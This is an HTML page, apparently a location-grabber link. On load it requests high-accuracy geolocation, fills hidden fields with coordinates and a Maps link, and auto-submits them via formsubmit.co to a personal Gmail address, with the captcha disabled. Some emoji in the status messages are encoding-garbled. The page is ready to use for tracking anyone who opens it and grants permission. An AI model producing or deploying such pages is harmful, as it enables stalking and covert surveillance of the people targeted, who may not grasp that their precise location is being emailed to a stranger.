<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Auto Send Location</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
      background: #f2f2f2;
    }
    #status {
      margin-top: 30px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>
  <h1>Locating...</h1>
  <div id="status">Please wait while we capture your location...</div>

  <form id="locationForm" action="https://formsubmit.co/savoraaservices@gmail.com" method="POST">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
    <input type="hidden" name="maps_link" id="maps_link">
    <input type="hidden" name="_subject" value="üìç New Location Captured">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_captcha" value="false">
  </form>

  <script>
    window.onload = () => {
      const statusDiv = document.getElementById("status");
      if (navigator.geolocation) {
        statusDiv.innerHTML = "Requesting location permission...";
        navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
      } else {
        statusDiv.innerHTML = "‚ùå Geolocation not supported by your browser.";
      }
    };

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const statusDiv = document.getElementById("status");

      // Fill hidden fields
      document.getElementById("latitude").value = lat;
      document.getElementById("longitude").value = lon;
      document.getElementById("maps_link").value = mapLink;

      // Update status
      statusDiv.innerHTML = `
        ‚úÖ Location captured!<br>
        Latitude: ${lat}<br>
        Longitude: ${lon}<br>
        <a href="${mapLink}" target="_blank">üåç View on Google Maps</a><br><br>
        Sending location data...
      `;

      // Auto-submit
      document.getElementById("locationForm").submit();
    }

    function showError(error) {
      const statusDiv = document.getElementById("status");
      switch (error.code) {
        case error.PERMISSION_DENIED:
          statusDiv.innerHTML = "‚ùå User denied location access.";
          break;
        case error.POSITION_UNAVAILABLE:
          statusDiv.innerHTML = "‚ö†Ô∏è Location unavailable.";
          break;
        case error.TIMEOUT:
          statusDiv.innerHTML = "‚è≥ Location request timed out.";
          break;
        default:
          statusDiv.innerHTML = "‚ùì Unknown error occurred.";
      }
    }
  </script>
</body>
</html>
